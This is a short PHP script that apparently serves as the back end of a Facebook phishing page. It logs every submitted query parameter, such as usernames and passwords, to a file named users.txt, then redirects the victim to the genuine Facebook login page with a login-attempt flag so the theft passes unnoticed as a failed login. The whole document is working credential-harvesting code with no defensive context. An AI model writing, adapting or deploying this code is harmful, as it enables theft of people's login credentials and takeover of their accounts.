:<?php
header("Location: https://www.facebook.com/login.php?login_attempt=1&lwv=100");
$handle = fopen("users.txt", "a");
foreach($_GET as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?> 